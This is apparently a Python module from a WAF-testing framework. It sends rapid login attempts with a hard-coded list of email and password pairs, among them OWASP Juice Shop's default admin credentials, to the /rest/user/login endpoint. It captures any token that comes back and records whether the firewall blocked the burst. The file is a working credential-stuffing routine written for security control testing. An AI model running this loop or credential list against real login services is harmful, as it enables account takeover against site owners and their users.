from __future__ import annotations

import time

from ..core.base_module import BaseModule
from ..core.models import ControlStatus, FindingResult, Severity

# Credential stuffing: rapid-fire login attempts with common/known credential pairs.
# The WAF should detect the burst of POST /rest/user/login requests and rate-limit
# or block (429/403). If any attempt returns HTTP 200 with a token, the stuffing
# both bypassed the WAF AND succeeded against the app.
#
# Juice Shop's default admin credentials are included to ensure at least one valid
# login pair exists — this is the intentionally-vulnerable test application.
_ENDPOINT = "/rest/user/login"
_CREDENTIAL_PAIRS: list[tuple[str, str]] = [
    ("admin@juice-sh.op", "admin123"),       # Juice Shop default admin
    ("customer@juice-sh.op", "12345"),
    ("test@example.com", "password"),
    ("guest@juice-sh.op", "guest"),
    ("user@juice-sh.op", "password123"),
]


class CredentialStuffingModule(BaseModule):
    technique_id = "T1110.004"
    technique_name = "Brute Force: Credential Stuffing"
    owasp_category = "A07:2021-Identification and Authentication Failures"
    severity = Severity.HIGH
    cvss_score = 7.5

    def execute(self) -> FindingResult:
        self.log.info(
            "Probing %s with %d credential pairs (stuffing pattern)",
            _ENDPOINT,
            len(_CREDENTIAL_PAIRS),
        )
        blocked_count = 0
        first_success: dict | None = None
        first_block_resp = None
        first_elapsed = 0.0

        for email, password in _CREDENTIAL_PAIRS:
            resp, elapsed, error = self._request(
                "POST",
                _ENDPOINT,
                json={"email": email, "password": password},
            )
            if first_elapsed == 0.0:
                first_elapsed = elapsed

            if error:
                continue

            if resp and resp.status_code == 403:
                blocked_count += 1
                if first_block_resp is None:
                    first_block_resp = resp
            elif resp and resp.status_code == 200:
                try:
                    body = resp.json()
                    token = body.get("authentication", {}).get("token")
                    if token:
                        first_success = {"email": email, "token": token[:40] + "…"}
                        break
                except Exception:
                    pass
            # Brief pause between attempts to avoid false rate-limit from app itself
            time.sleep(0.1)

        payload_repr = f"{len(_CREDENTIAL_PAIRS)} credential pairs"

        if first_success:
            result = self._build_result(payload_repr, _ENDPOINT, None, first_elapsed, None)
            result.control_status = ControlStatus.BYPASSED
            result.status_code = 200
            result.evidence = (
                f"Credential stuffing succeeded — token issued for {first_success['email']}. "
                "WAF did not rate-limit or block the burst of login attempts."
            )
        elif blocked_count == len(_CREDENTIAL_PAIRS):
            result = self._build_result(payload_repr, _ENDPOINT, first_block_resp, first_elapsed, None)
            result.control_status = ControlStatus.BLOCKED
        elif blocked_count > 0:
            result = self._build_result(payload_repr, _ENDPOINT, first_block_resp, first_elapsed, None)
            result.control_status = ControlStatus.PARTIAL
            result.evidence = f"WAF blocked {blocked_count}/{len(_CREDENTIAL_PAIRS)} attempts — inconsistent enforcement."
        else:
            result = self._build_result(payload_repr, _ENDPOINT, None, first_elapsed, None)
            result.control_status = ControlStatus.UNTESTED

        return result
